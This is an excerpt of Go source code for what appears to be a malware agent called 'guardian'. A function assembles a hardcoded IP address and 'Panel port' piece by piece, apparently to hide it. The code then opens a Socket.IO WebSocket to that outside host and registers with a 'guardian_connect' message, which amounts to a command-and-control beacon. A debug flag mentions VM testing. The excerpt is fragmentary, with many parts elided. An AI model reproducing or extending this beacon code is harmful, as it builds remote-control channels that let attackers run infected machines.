...
func tI() {
	...
	addStr(90, "http://")
	addStr(91, "72.62.176.229")
	addStr(92, ":8000") // Panel port
...
func getWebSocketURL() string {
	return "ws://72.62.176.229:8000/socket.io/?EIO=4&transport=websocket"
}
...
func connectWebSocket() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[WS] connectWebSocket panic: %v\n", r)
		}
	}()
	...
	if wsURL == "" {
		fmt.Println("[WS] No WebSocket URL")
		return
	}
	...
	if err != nil {
		...
		if resp != nil {
			fmt.Printf("[WS] HTTP status: %d\n", resp.StatusCode)
		}
		return
	}
	
	if conn == nil {
		fmt.Println("[WS] Connection is nil")
		return
	}
	
	fmt.Println("[WS] WebSocket connected, waiting for Engine.IO open packet...")
	
	// Engine.IO websocket transport sends an initial open packet: 0{"sid":...}
	// Wait for it before sending Socket.IO connect (40)
	_ = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	_, openMsg, err := conn.ReadMessage()
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		fmt.Printf("[WS] Failed to read open packet: %v\n", err)
		conn.Close()
		return
	}
	fmt.Printf("[WS] Received open packet: %s\n", string(openMsg))
	
	// Verify it's an Engine.IO open packet (starts with '0')
	if len(openMsg) == 0 || openMsg[0] != '0' {
		fmt.Printf("[WS] Unexpected open packet, expected '0{...}', got: %s\n", string(openMsg))
		conn.Close()
		return
	}
	...
	// Send Socket.IO Connect packet (40) to join default namespace
	fmt.Println("[WS] Sending Socket.IO connect packet: 40")
	wsMutex.Lock()
	err = conn.WriteMessage(websocket.TextMessage, []byte("40"))
	wsMutex.Unlock()
	if err != nil {
		fmt.Printf("[WS] Failed to send 40: %v\n", err)
		wsMutex.Lock()
		wsConnected = false
		conn.Close()
		wsMutex.Unlock()
	...
	// Wait for Socket.IO connect ack (40) from server
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	_, ackMsg, err := conn.ReadMessage()
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		fmt.Printf("[WS] Failed to read connect ack: %v\n", err)
	} else {
		fmt.Printf("[WS] Received after 40: %s\n", string(ackMsg))
	}
	...
	fmt.Printf("[WS] Sending guardian_connect: %s\n", connectMsg)

	wsMutex.Lock()
	if err := conn.WriteMessage(websocket.TextMessage, []byte(connectMsg)); err != nil {
		fmt.Printf("[WS] Failed to send guardian_connect: %v\n", err)
		wsConnected = false
		conn.Close()
		wsMutex.Unlock()
		return
	...
	fmt.Println("[WS] guardian_connect sent, starting message handler")
...
// ==================== CONFIG ====================
const (
	DEBUG_MODE             = true // SET TO TRUE FOR VM TESTING
...
// StartGuardian starts the guardian agent
func StartGuardian() {
    tI()
}